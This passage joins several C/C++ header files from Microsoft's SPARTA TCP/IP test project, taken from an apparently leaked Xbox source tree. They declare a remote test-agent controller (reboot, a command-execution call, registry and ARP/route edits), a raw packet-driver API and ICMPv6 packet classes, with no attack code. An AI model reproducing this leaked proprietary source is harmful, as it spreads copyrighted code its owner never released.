typedef DWORD (*SEND_HANDLER) (PVOID pvContextHandle, PVOID pvBuffer, ULONG ulLength);

typedef DWORD (*RECEIVE_HANDLER) (PVOID pvContextHandle, PVOID pvBuffer, ULONG ulLength,                                                   
                                  PULONG pulBytesRead, DWORD dwTimeout);   

/**********************************************************************************
 * Debug levels and macros
 **********************************************************************************/

#if (0)
#ifndef DEBUGMSG1
 
#define DEBUGMSG1(level, format, arg) (printf(format, arg))

#endif

#ifndef DEBUGMSG

#define DEBUGMSG(level, format) (printf(format))

#endif
#endif


//
// Debug levels
//
#define DBG_CONTROLLER_VERBOSE  3
#define DBG_CONTROLLER_ERROR    2
#define DBG_CONTROLLER_WARNING  1


//
// Winsock send and receive handlers
//
DWORD WinsockSendHandler(PVOID pvContextHandle, PVOID pvBuffer, ULONG ulLength);
DWORD WinsockRecvHandler(PVOID pvContextHandle, PVOID pvBuffer, ULONG ulLength,                             
                         PULONG pulBytesRead, DWORD dwTimeout);

typedef struct WSCONTEXT {
    SOCKET Socket;
    SOCKADDR_IN Address;
} WSCONTEXT, *PWSCONTEXT;


class CController {
private:
    LONG m_lTID;
    SEND_HANDLER m_pfnSendHandler;
    RECEIVE_HANDLER m_pfnReceiveHandler;
    PVOID m_pvContextHandle;
    INT m_iRexmitCount;
    DWORD m_dwInitRexmitTimeout;
    DWORD m_dwRexmitTimeoutDelta;
    BOOL m_fWinsock;


    DWORD GetUniqueResponseId();
    PVOID SendAndReceive(tGenericStruct *pCommandStruct, DWORD dwLength,                                  
                         PDWORD pdwCommandStatus, PDWORD pdwStatus);
    DWORD Cleanup();

public:
    CController(PVOID pvContextHandle, SEND_HANDLER pfnSendHandler, 
                RECEIVE_HANDLER pfnReceiveHandler);
    
    //
    // Will create a controller which uses Winsock to talk with autosrv
    //
    CController(PCHAR pszSrcIP, PCHAR pszDstIP, USHORT usSrcPort, USHORT usDstPort,                         
                PDWORD pdwStatus);
    ~CController();

    /*********************************************************************
     * Functions exposed by AutoSrv
     *********************************************************************/

    //
    // Miscellaneous commands
    //
    DWORD Reboot();
    DWORD SetPowerState(BOOL fSuspend, ULONG ulTimeout=0);
    DWORD Ping();
    DWORD System(PTCHAR pszCommand);


    //
    // IPHlpAPI functions
    //
    PMIB_IPNETTABLE GetArpCache(PDWORD pdwStatus);
    DWORD FlushArpCache(DWORD dwAdapterIndex);
    DWORD DeleteArpCacheEntry(DWORD dwAdapterIndex, PTCHAR pszIPAddress, 
                              PTCHAR pszMacAddress, DWORD dwType);
    DWORD AddArpCacheEntry(DWORD dwAdapterIndex, PTCHAR pszIPAddress, 
                           PTCHAR pszMacAddress, DWORD dwType);
    DWORD CheckArpCacheEntry(DWORD dwAdapterIndex, PTCHAR pszIPAddress, 
                             PTCHAR pszMacAddress, PBOOL pfPresent);
    PMIB_IPFORWARDTABLE GetRouteTable(PDWORD pdwStatus);
    DWORD DeleteRouteTableEntry(DWORD dwAdapterIndex, PTCHAR pszTargetIP, PTCHAR pszGWIP, 
                                PTCHAR pszMask, DWORD dwMetric, DWORD dwType);
    DWORD AddRouteTableEntry(DWORD dwAdapterIndex, PTCHAR pszTargetIP, PTCHAR pszGWIP, 
                             PTCHAR pszMask, DWORD dwMetric, DWORD dwType);
    DWORD GetNumInterfaces(PDWORD pdwCount);
    DWORD GetInterfaceIndex(PTCHAR pszFriendlyName, PDWORD pdwIndex);
    DWORD GetIndexByIP(PTCHAR pszIPAddress, PDWORD pdwIndex);
    DWORD DeleteIP(ULONG ulNTEContext);
    DWORD AddIP(DWORD dwAdapterIndex, PTCHAR pszIPAddress, PTCHAR pszMask, 
                PULONG pulNTEContext);
    PMACADDR SendArp(PTCHAR pszDestIP, PTCHAR pszSrcIP, PDWORD pdwStatus);

    //
    // Registry commands
    //
    DWORD CreateRegistryKey(HKEY hMainKey, PTCHAR pszSubKey, DWORD dwOptions, REGSAM Sam);
    DWORD DeleteRegistryKey(HKEY hMainKey, PTCHAR pszSubKey);
    DWORD DeleteRegistryValue(HKEY hMainKey, PTCHAR pszSubKey, PTCHAR pszValueName);
    DWORD DeleteRegistryValueByIp(HKEY hMainKey, PTCHAR pszIPAddress, PTCHAR pszValueName);
    DWORD SetRegistryValue(HKEY hMainKey, PTCHAR pszSubKey, PTCHAR pszValueName, DWORD dwType,
                           PBYTE pbValue, DWORD dwLength);
    tResponse_GetRegistryValue* GetRegistryValue(HKEY hMainKey, PTCHAR pszSubKey, 
                                                 PTCHAR pszValueName, PDWORD pdwStatus);
    DWORD SetRegistryValueByIp(HKEY hMainKey, PTCHAR pszIPAddress, PTCHAR pszValueName, 
                               DWORD dwType, PBYTE pbValue, DWORD dwLength);
    tResponse_GetRegistryValue* GetRegistryValueByIp(HKEY hMainKey, PTCHAR pszIPAddress,                                              
                                                     PTCHAR pszValueName, PDWORD pdwStatus);


    //
    // Session commands
    //
    DWORD Socket(INT iType, PDWORD pdwSessionId);
    DWORD Bind(DWORD dwSessionId, PTCHAR pszSrcIP, USHORT usSrcPort);
    DWORD CreateAndBind(INT iType, PTCHAR pszSrcIP, USHORT usSrcPort, PDWORD pdwSessionId);
    DWORD SetSocketOption(DWORD dwSessionId, INT iLevel, INT iOption, PCHAR pchValue, INT iSize);
    DWORD CreateAndConnect(PDWORD pdwTID, INT iType, PTCHAR pszSrcIP, USHORT usSrcPort,                   
                           PTCHAR pszDestIP, USHORT usDestPort, PDWORD pdwSessionId);
    DWORD Connect(PDWORD pdwTID, DWORD dwSessionId, PTCHAR pszDestIP, USHORT usDestPort);
    DWORD ConnectEx(PDWORD pdwTID, DWORD dwSessionId, PTCHAR pszDestIP, 
                    USHORT usDestPort, INT iBufferSize, PCHAR pchBuffer=NULL);
    DWORD CreateAndAccept(PDWORD pdwTID, INT iType, PTCHAR pszSrcIP, USHORT usSrcPort, 
                          INT iListenQ, PDWORD pdwSessionId);
    DWORD Accept(PDWORD pdwTID, DWORD dwSessionId, INT iListenQ);
    DWORD Receive(PDWORD pdwTID, DWORD dwSessionId, DWORD dwIterations, DWORD dwDelay,                        
                  INT iBufferSize);
    DWORD Send(PDWORD pdwTID, DWORD dwSessionId, DWORD dwIterations, DWORD dwDelay,                     
               INT iBufferSize, PCHAR pchBuffer=NULL);
    DWORD OverlappedSend(PDWORD pdwTID, DWORD dwSessionId, INT iNumBuffers, INT iBufferSize);
    DWORD SendAndDisconnect(PDWORD pdwTID, DWORD dwSessionId, INT iBufferSize, PCHAR pchBuffer=NULL);
    DWORD GetSessionStats(DWORD dwSessionId, PDWORD pdwBytesSent, PDWORD pdwBytesRcvd);
    //DWORD GetAsyncCompletionStatus(DWORD dwSessionId, DWORD dwAsyncTID, PDWORD pdwAsyncStatus);
    DWORD GetCurrentStatus(DWORD dwSessionId, DWORD dwAsyncTID, PDWORD pdwAsyncStatus);
    DWORD Stop(DWORD dwSessionId, DWORD dwAsyncTID, PDWORD pdwAsyncStatus);
    DWORD Shutdown(PDWORD pdwTID, DWORD dwSessionId);
    DWORD Close(PDWORD pdwTID, DWORD dwSessionId);
    DWORD Reset(PDWORD pdwTID, DWORD dwSessionId);
};
          
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\dbgmsg.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: dbgmsg.c                                                                    *
* Description: Enables the filtering and setting of various debug traces                *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/16/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_DBGMSG_H__
#define __SPARTA_DBGMSG_H__


#ifdef __cplusplus
extern "C" {
#endif

/*++

HACKED PORT TO USER MODE

--*/

extern UINT DbgSettings;

//
// This function MUST be provided by the application
// This string is always printed to the log.
//
void LogDebugMessage(TCHAR *string);

#if DBG


VOID DEBUGPRINT(TCHAR *szFormat, ...);


#define SETDEBUGMASK(x) (DbgSettings = x)

#define DEBUGZONE(n)  (DbgSettings & (0x00000001<<n))

// returns current call stack. Note that it's not thread-safe and
// you must check the thread id's in the stack trace yourself to see
// which thread is doing what. Caller's responsibility to free returned
// buffer.

TCHAR *DBGMSG_CreateStackStringCopy();


    
#define DEBUGMSG(dbgs,format) ((dbgs) ? printindenting format : 0)
    
void printindenting(TCHAR *szFormat, ...);
    
//
// debug levels for user mode code.
// zones 16-31 are reserved for the app calling this lib
//
// this is the mask set at driver initialization
#define INITIAL_DEBUG_MASK      0x0000c000
#define DEBUG_ALL               0x0000FFFF


#define DBG_INIT                DEBUGZONE(0)
#define DBG_SPARTA_PROTOCOLAPI  DEBUGZONE(1)
#define DBG_SPARTA_PACKETAPI    DEBUGZONE(2)
#define DBG_SPARTA_DRIVERAPI    DEBUGZONE(3)
#define DBG_SPARTA_MEMORYAPI    DEBUGZONE(4)
#define DBG_REF                 DEBUGZONE(12)
#define DBG_VERBOSE             DEBUGZONE(13)
#define DBG_WARN                DEBUGZONE(14)
#define DBG_ERROR               DEBUGZONE(15)


//
// debug levels for the driver.  Must be same as in driver\inc\dbgdrv.h
// to be used in calls to NI_SetDriverDebugMask
//
#define SYS_DBG_INIT                DEBUGZONE(0)

#define SYS_DBG_NDIS_OPEN           DEBUGZONE(1)
#define SYS_DBG_NDIS_BIND           DEBUGZONE(2)
#define SYS_DBG_NDIS_TX             DEBUGZONE(3)
#define SYS_DBG_NDIS_RX             DEBUGZONE(4)
#define SYS_DBG_NDIS_REQ            DEBUGZONE(5)
#define SYS_DBG_NDIS_PNP            DEBUGZONE(6)
#define SYS_DBG_NDIS_RESET          DEBUGZONE(7)
#define SYS_DBG_NDIS_STATUS         DEBUGZONE(8)


#define SYS_DBG_RX                  DEBUGZONE(16)
#define SYS_DBG_TX                  DEBUGZONE(17)
#define SYS_DBG_OPENCB              DEBUGZONE(18)
#define SYS_DBG_DEVIOCTL            DEBUGZONE(19)
#define SYS_DBG_OID                 DEBUGZONE(20)
#define SYS_DBG_RESET               DEBUGZONE(21)
#define SYS_DBG_ENUMERATE           DEBUGZONE(22)

#define SYS_DBG_REF                 DEBUGZONE(28)
#define SYS_DBG_VERBOSE             DEBUGZONE(29)
#define SYS_DBG_WARN                DEBUGZONE(30)
#define SYS_DBG_ERROR               DEBUGZONE(31)

//
// This function MUST be provided by the application
// String is written to debugger, or to log if flag set property (spartacom)
//
void PrintDebug(TCHAR *string);

#else

#define DEBUGMSG(d,f)   (0)

#endif


#ifdef __cplusplus
} // for the extern "C" declaration
#endif

#endif // __SPARTA_DBGMSG_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\autoneighbor.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: AutoNeighbor.hpp                                                            *
* Description: This is the implementation of Automatic Neighbor discovery functionality.*
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                       timothyw      1/16/2001    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2001                          *
*****************************************************************************************/

#ifndef __SPARTA_AUTONEIGHBOR_HPP__
#define __SPARTA_AUTONEIGHBOR_HPP__

#include "Sparta.h"
#include "Media.h"
#include <ipexport.h>

class CInterface;
class CMacAddress;


class CAutoNeighbor
{
protected:
   CRITICAL_SECTION  m_csResolvingIpAddress;
   HANDLE            m_hResolutionEvent;
   HANDLE            m_hShutdownEvent;
   BOOL              m_fThreadHasQuit; // used to sync object destruction
   MAC_MEDIA_TYPE    m_MediaType;
   IPv6Addr          *m_pRequestedIpAddress;
   CMacAddress       *m_pLocalMacAddress;
   CMacAddress       *m_pResolvedMacAddress;
   CInterface        *m_pInterface;

   TCHAR             *m_szInterfaceDescriptor;
   TCHAR             *m_szLocalMacAddress;
   IPv6Addr          *m_pLocalIpAddress;

   VOID AutoNeighborListener();

   friend DWORD WINAPI LaunchAutoNeighborThread(LPVOID pvContext);
    // this function will call the AutoNeighborListener...

private:
   Init(TCHAR        *szInterfaceDescriptor,
        TCHAR        *szMacAddress,
        IPv6Addr     *pLocalIpAddress);

public:

   // this constructor will use the Interface's own MAC address for ND responses

   CAutoNeighbor(TCHAR    *szInterfaceDescriptor,
                 IPv6Addr *pLocalIpAddress);


   // this constructor will use the supplied MAC address for ND responses - this
   // HAS to be a multicast MAC address (since we add it to the mcast addr list and
   // then filter based on mcast addresses)

   CAutoNeighbor(TCHAR *szInterfaceDescriptor,
                 TCHAR *szMacAddress,
                 IPv6Addr *pLocalIpAddress);


   ~CAutoNeighbor();

   CMacAddress *ResolveIpAddress(IPv6Addr   *pIpAddr);
};

#endif // __SPARTA_AUTONEIGHBOR_HPP__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\autoarp.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: AutoArp.hpp                                                                 *
* Description: This is the implementation of Automatic ARP handler functionality.       *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      5/23/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_AUTOARP_HPP__
#define __SPARTA_AUTOARP_HPP__

#include "Sparta.h"
#include "Interface.hpp"
#include "MacAddress.hpp"

class CAutoArp
{
protected:

    CRITICAL_SECTION    m_csResolvingIpAddress;
    HANDLE              m_hResolutionEvent;
    HANDLE              m_hShutdownEvent;
    BOOL                m_fThreadHasQuit; // used to sync object destruction
    CInterface          *m_pInterface;
    MAC_MEDIA_TYPE      m_MediaType;
    ULONG               m_ulRequestedIpAddress;
    CMacAddress         *m_pLocalMacAddress;
    CMacAddress         *m_pResolvedMacAddress;

    TCHAR               *m_szInterfaceDescriptor;
    TCHAR               *m_szLocalMacAddress;
    TCHAR               *m_szLocalIpAddress;

    VOID AutoArpListener();

    friend DWORD WINAPI LaunchAutoArpThread(LPVOID pvContext);
    // this function will call the AutoArpListener...

private:
    Init(TCHAR *szInterfaceDescriptor,
             TCHAR *szMacAddress,
             TCHAR *szLocalIpAddress); // object initialization

public:

    // this constructor will use the Interface's own MAC address for ARP responses

    CAutoArp(TCHAR *szInterfaceDescriptor,
             TCHAR *szLocalIpAddress);


    // this constructor will use the supplied MAC address for ARP responses - this
    // HAS to be a multicast MAC address (since we add it to the mcast addr list and
    // then filter based on mcast addresses)

    CAutoArp(TCHAR *szInterfaceDescriptor,
             TCHAR *szMacAddress,
             TCHAR *szLocalIpAddress);


    ~CAutoArp();

    CMacAddress *ResolveIpAddress(ULONG ulRequestedIpAddr);    // expects NETWORK byte ordering
    CMacAddress *ResolveIpAddress(TCHAR *szRequestedIpAddr)
    {
       return ResolveIpAddress(inet_addr(szRequestedIpAddr));
    }
};

#endif // __SPARTA_AUTOARP_HPP__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\icmppacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ICMPPacket.hpp                                                              *
* Description: this defines the Packet class for IP Packets, extends the MAC Packet     *
*               class                                                                   *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/2/2000    created                                *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_ICMP_PACKET_H__
#define __SPARTA_ICMP_PACKET_H__

#include "sparta.h"
#include "IPHeader.hpp"
#include "IPOptions.hpp"
#include "ICMPHeader.hpp"
#include "Packet.hpp"


class CICMPPacket : public CIPPacket
{
public:
   CICMPHeader &ICMPHeader;

   CICMPPacket(MAC_MEDIA_TYPE MediaType,UCHAR type);
   CICMPPacket(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPHeader &IPHeader,CICMPHeader &ICMPHeader);
   virtual ~CICMPPacket();

   virtual int GetPacketType();

   virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                           // primarily used for CICMPPacket layer

   virtual SPARTA_STATUS PreparePacketForSend();

   virtual void PrintPacket();
};

#endif // __SPARTA_ICMP_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\driverapi.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: driverapi.h                                                                 *
* Description: this code provides an user mode API to the tardis/sparta packet driver   *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/10/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_DRIVERAPI_H__
#define __SPARTA_DRIVERAPI_H__

#include "sparta.h"
#include "media.h"
#include "adapterinfo.h"

#ifdef __cplusplus
extern "C" {
#endif

#define     MAXIMUM_POSSIBLE_MEDIA_ADDRESS_LENGTH   12 // picked arbitrary large number
#define     MAXIMUM_POSSIBLE_NUMBER_OF_ADAPTERS     100
#define     MAXIMUM_POSSIBLE_PACKET_LENGTH          4096 // arbitrary large number

typedef struct
{
   HANDLE         hAdapterHandle;
   MAC_MEDIA_TYPE MediaType;
   MAC_ADDRESS    MacAddress;
//    PADAPTER_INFO pAdapterInfo;
} tNI_INTERFACE, *NI_INTERFACE;

typedef struct
{
   DWORD dwOffset;
   DWORD dwLength;
   PVOID pvPattern;
} tNI_PATTERN, *NI_PATTERN;

#ifdef   INCLUDE_UNUSED
typedef struct
{
   NI_INTERFACE   Interface;
   DWORD          dwSelectStatus;
} tNI_SELECT_STRUCTURE, *NI_SELECT_STRUCTURE;
#endif


NI_INTERFACE NI_OpenInterfaceByName(const TCHAR *szInterfaceDescriptor);
// currently the name of the interface is the same as its media address

NI_INTERFACE NI_OpenInterfaceByIndex(DWORD dwInterfaceIndex);
// this index corresponds to the index in the adapter enumeration

SPARTA_STATUS NI_EnumerateAdapters(OUT PADAPTER_INFO pAdapterInfo, IN OUT PDWORD pcbAdapterInfo);

SPARTA_STATUS NI_CloseInterface(NI_INTERFACE Interface);

MAC_MEDIA_TYPE NI_GetMediaType(NI_INTERFACE Interface);

#ifdef   INCLUDE_UNUSED
MAC_ADDRESS NI_GetMediaAddress(NI_INTERFACE Interface);
// returns the media address of the NIC
#endif

NI_PATTERN NI_CreatePattern(DWORD dwOffset, DWORD dwLength, PVOID pvBuffer);
SPARTA_STATUS NI_DeletePattern(NI_PATTERN);

SPARTA_STATUS NI_AddPatternFilter(NI_INTERFACE Interface, NI_PATTERN Pattern);
SPARTA_STATUS NI_RemovePatternFilter(NI_INTERFACE Interface, NI_PATTERN Pattern);

SPARTA_STATUS NI_EnablePatternFiltering(NI_INTERFACE Interface);
SPARTA_STATUS NI_DisablePatternFiltering(NI_INTERFACE Interface);

//
// Warning: be very careful when you put the adapter into promiscuous mode
// the filters will be very busy and you put additional load on the CPU since
// the netork card will not do the address filtering for the driver
//
// receive modes are based on the NDIS modes. Use the following constants (can be or'd together):
// NDIS_PACKET_TYPE_PROMISCUOUS, NDIS_PACKET_TYPE_DIRECTED,
// NDIS_PACKET_TYPE_BROADCAST, NDIS_PACKET_TYPE_MULTICAST
//
// NOTE: DUE TO AN ARCHITECTUAL ISSUE, THE INTERFACE MODE WILL CURRENTLY APPLY TO *ALL*
// OPEN INTERFACES, SO TAKE CARE IN MANIPULATING THE INTERFACE MODE. IF YOU NEED TO MAKE
// THE RECEIVE MODE RESTRICTIVE, YOU MIGHT CONSIDER USING FILTERS

SPARTA_STATUS NI_SetInterfaceMode(NI_INTERFACE Interface, DWORD dwMode);

#ifdef   INCLUDE_UNUSED
SPARTA_STATUS NI_AddAddressFilter(NI_INTERFACE Interface, MAC_ADDRESS MediaAddress);

SPARTA_STATUS NI_AddMulticastAddress(NI_INTERFACE Interface, MAC_ADDRESS MediaAddress);

SPARTA_STATUS NI_RemoveMulticastAddress(NI_INTERFACE Interface, MAC_ADDRESS MediaAddress);
#endif

// The "raw" variations take a buffer rather than a MediaAddress struct

SPARTA_STATUS NI_AddMulticastAddressRaw(NI_INTERFACE Interface, WORD wLength, PBYTE Buffer);

SPARTA_STATUS NI_RemoveMulticastAddressRaw(NI_INTERFACE Interface, WORD wLength, PBYTE Buffer);

SPARTA_STATUS NI_StartListening(NI_INTERFACE Interface);
SPARTA_STATUS NI_StopListening(NI_INTERFACE Interface);

// The start and stop listening is added for convenience: when manipulating the 
// pattern filters, receive modes and multicast addresses, it is useful to stop
// the driver from receiving packets temporarily (so that the filter manipulation 
// can act as an atomic operation). After an interface is opened, it will be in
// "not listening" mode, so call start listening after setting up your filters etc.. 

#ifdef   INCLUDE_UNUSED
SPARTA_STATUS NI_FlushQueue(NI_INTERFACE Interface);
#endif


// The SPARTA driver supports asynchronous I/O so all that needs to be changed 
// are the NI_Send and NI_Receive calls to be async, maybe add functions to
// such as NI_AsyncReceive and NI_AsyncSend

SPARTA_STATUS NI_Send(NI_INTERFACE Interface,PVOID buffer, DWORD length);
// blocking call to send the data

#ifdef   INCLUDE_UNUSED
SPARTA_STATUS NI_Select(DWORD dwTimeout, NI_SELECT_STRUCTURE, ...);
#endif

SPARTA_STATUS NI_Receive(NI_INTERFACE Interface, PVOID pvBuffer, DWORD dwLength, 
                            DWORD *pdwBytesRead, HANDLE hTimerEventHandle, DWORD dwTimeout);
// blocking call to receive data, will unblock if timerevent fires or the specified timeout
// expires. in both cases, ERROR_TIMEOUT will be returned
// timerobject handle may be NULL (i.e. it's optional)
// dwTimeout is optional (0 is interpreted as an infinite timeout)


// UTILITY FUNCTION FOR DEBUGGING - sets the debugging mask for the kernel mode driver
// output goes to the kernel debugger if present
// see dbgmsg.h for mask types

DWORD NI_SetDriverDebugMask(IN ULONG ulDebugMask);


#ifdef __cplusplus
} // for the extern "C" declaration
#endif

#endif // __SPARTA_DRIVERAPI_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\icmpv6packet.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ICMPv6Packet.hpp                                                            *
* Description: this defines the Packet class for Icmp v6 Packets, extends the MAC Packet*
*               class                                                                   *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                       deepakp      5/2/2000    created                                *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                       timothyw     12/27/2000  copied, modified for ipv6              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_ICMPv6_PACKET_H__
#define __SPARTA_ICMPv6_PACKET_H__

#include "sparta.h"
#include "IPHeader.hpp"
#include "IPPacket.hpp"
//#include "IPOptions.hpp"
#include "ICMPv6Header.hpp"
#include "Packet.hpp"


class CICMPv6Packet : public CIPPacket
{
   BOOL     m_AutoCalcChecksum;

public:
   CICMPv6Header &ICMPHeader;

   CICMPv6Packet(MAC_MEDIA_TYPE MediaType, UCHAR type);
   CICMPv6Packet(PKT_PACKET Packet, 
                 CMacHeader &MacHeaderParam, 
                 CIPHeader &IPHeader,
                 CICMPv6Header &ICMPHeader);

   virtual ~CICMPv6Packet();

   virtual int GetPacketType();

   virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                           // primarily used for CICMPPacket layer

   virtual SPARTA_STATUS PreparePacketForSend();

   virtual void PrintPacket();

   SPARTA_STATUS  SetAutoCalcChecksum(BOOL  status);

   USHORT   CalcChecksum();
};

#endif // __SPARTA_ICMPv6_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\icmpv6header.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ICMPv6Header.hpp                                                            *
* Description: This is the description of the ICMPv6Header functions                    *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/2/2000    created                                *
*                       timothyw     12/27/2000  copied from icmpheader.hpp             *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_ICMPv6HEADER_H__
#define __SPARTA_ICMPv6HEADER_H__


#include "packets.h"
#include "IPConstants.h"
#include <ipexport.h>
#include "media.h"

//
// structures for the second dword of the icmpv6 header
//
struct   WordWord
{
   WORD  WordOne;
   WORD  WordTwo;
};


struct   ByteByteWord 
{
   BYTE  ByteOne;
   BYTE  ByteTwo;
   WORD  WordOne;
};


//
// main icmp header structure
//
struct      ICMPv6_HEADER
{
   UCHAR    ucType;
   UCHAR    ucCode;
   USHORT   usChksum;

   union 
   {
      ULONG          ulData;
      WordWord       wwData;
      ByteByteWord   bbwData;
   }  icmp_header_data;
};
typedef  ICMPv6_HEADER  *PICMPv6_HEADER;


//
// defines to provide meaningful names for the union fields.
//

//
// used by ICMPv6_DESTINATION_UNREACHABLE
//         ICMPv6_TIME_EXCEEDED
//         ICMPv6_ROUTER_SOLICITATION
//         ICMPv6_NEIGHBOR_SOLICITATION
//         ICMPv6_NEIGHBOR_ADVERTISEMENT
//         ICMPv6_REDIRECT
//
#define icmp6_reserved         icmp_header_data.ulData

//
// used by ICMPv6_PACKET_TOO_BIG
//
#define icmp6_mtu              icmp_header_data.ulData

//
// used by ICMPv6_PAARAMETER_PROBLEM
//
#define icmp6_ptr              icmp_header_data.ulData


//
// used by ICMPv6_ECHO_REQUEST
//         ICMPv6_ECHO_REPLAY
#define icmp6_id               icmp_header_data.wwData.WordOne
#define icmp6_seq              icmp_header_data.wwData.WordTwo

//
// used by ICMPv6_MULTICAST_LISTENER_QUERY
//         ICMPv6_MULTICAST_LISTENER_REPORT
//         ICMPv6_MULTICAST_LISTENER_DONE
//
#define icmp6_maxdelay         icmp_header_data.wwData.WordOne
#define icmp6_wreserved        icmp_header_data.wwData.WordTwo

//
// used by ICMPv6_ROUTER_ADVERTISEMENT
//
#define icmp6_curlimit         icmp_header_data.bbwData.ByteOne
#define icmp6_reservedflags    icmp_header_data.bbwData.ByteTwo
#define icmp6_lifetime         icmp_header_data.bbwData.WordOne


//
// definition for structures before options but after 8-bytes of header
// used by ICMPv6_ROUTER_ADVERTISEMENT
//
struct   ROUTER_ADVERTISEMENT
{
   ULONG ReachableTimer;
   ULONG RetransmitTimer;
};
typedef ROUTER_ADVERTISEMENT *PROUTER_ADVERTISEMENT;


//
// ICMPv6_NEIGHBOR_SOLICITATION, ICMPv6_NEIGHBOR_ADVERTISEMENT,
// ICMPv6_MULTICAST_LISTENER_QUERY, ICMPv6_MULTICAST_LISTENER_REPORT,
// ICMPv6_MULTICAST_LISTENER_DONE  use a single IPv6Addr
// ICMPv6_REDIRECT uses two of them
// 

//
// option header structure
//
struct   ICMPv6_OPTION
{
   UCHAR    ucType;
   UCHAR    ucLength;
};
typedef  ICMPv6_OPTION *PICMPv6_OPTION;

//
// possible option types: link layer address (6 bytes for ethernet/tokenring)
//                        router prefix ???
//                        redir header  ???
//                        mtu  -- ushort
//

#define MAX_ICMPv6_HEADER_LENGTH    (sizeof(ICMPv6_HEADER) + 2 * sizeof(IPv6Addr))
#define MAX_ICMPv6_OPTIONS          8


class CIPHeader;
class CUDPHeader;
class CTCPHeader;
class CIPPacket;

class CICMPv6Header
{
   friend class CICMPv6Packet;

   BOOL  ParseICMP(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);

protected:

   PKT_BUFFER     m_ICMPHeader;        // buffer storing the icmpv6 header (no user data or options?)
   PICMPv6_HEADER m_pIcmpHeader;       // ptr to the header itself
   PVOID          m_pvIcmpData;        // rest of header data (not used by all types)
   UCHAR          m_icmpType;          // local copy of icmp type
   PKT_BUFFER     m_Option[MAX_ICMPv6_OPTIONS];
   ULONG          m_NumOptions;

   BOOL  m_IsIPHeaderChained;
   BOOL  m_IsIPHeaderDataChained;
   BOOL  m_IsIPOptionsChained;
   BOOL  m_IsICMPErrHeaderChained;
   BOOL  m_IsTCPErrHeaderChained;
   BOOL  m_IsUDPErrHeaderChained;

   // This points to the IP Datagram (minus header) , the 8 bytes from the error datagram
   PKT_BUFFER  m_ICMPIPHeaderData;

   CICMPv6Header(PVOID pvRawData, DWORD dwBytesRemaining);
   SPARTA_STATUS ProcessIPErrorDatagram(CIPPacket *packet,DWORD bytesToCopy);

public:
   CIPHeader      *m_pICMPIPHeader;
   CUDPHeader     *m_pICMPUDPHeader;
   CTCPHeader     *m_pICMPTCPHeader;
   CICMPv6Header  *m_pICMPICMPHeader;

   PKT_BUFFER  GetRawBuffer();
   DWORD       GetRawBufferLength();
    
   // Default Constructor
   CICMPv6Header(UCHAR icmpType);


   // create a MEDIA header buffer from raw data, part of the parsing API
   // dwBytesRead will return the number of bytes used for the header
   // TO DO: Need to implement this function for parsing
